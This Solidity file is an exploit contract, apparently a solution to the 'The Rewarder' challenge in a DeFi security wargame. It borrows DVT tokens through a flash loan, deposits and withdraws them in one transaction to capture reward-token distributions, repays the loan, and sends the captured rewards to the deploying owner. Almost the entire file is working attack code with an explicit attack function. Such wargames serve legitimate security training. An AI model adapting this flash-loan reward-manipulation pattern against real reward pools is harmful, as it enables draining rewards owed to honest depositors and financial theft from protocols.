pragma solidity ^0.8.4;

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface ERC20Token {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}


contract TheRewarderExp {
    address owner;
    IFlashLoanerPool flash;
    ITheRewarderPool rewarder;
    ERC20Token dvt; 
    ERC20Token rwt;

    constructor(address _flashLoanAddr, address _rewarderPoolAddr, address _dvtAddr, address _rwtAddr) {
        owner = msg.sender;
        flash = IFlashLoanerPool(_flashLoanAddr);
        rewarder = ITheRewarderPool(_rewarderPoolAddr);
        dvt = ERC20Token(_dvtAddr);
        rwt = ERC20Token(_rwtAddr);
    }

    function receiveFlashLoan(uint256 _amount) external {
        dvt.approve(address(rewarder), _amount);
        rewarder.deposit(_amount);
        rewarder.withdraw(_amount);
        dvt.transfer(address(flash), _amount);
    }

    function attack(uint256 _loanAmount) public {
        flash.flashLoan(_loanAmount);
    }

    function withdraw() public {
        require(msg.sender == owner);
        rwt.transfer(payable(msg.sender), rwt.balanceOf(address(this)));
    }
}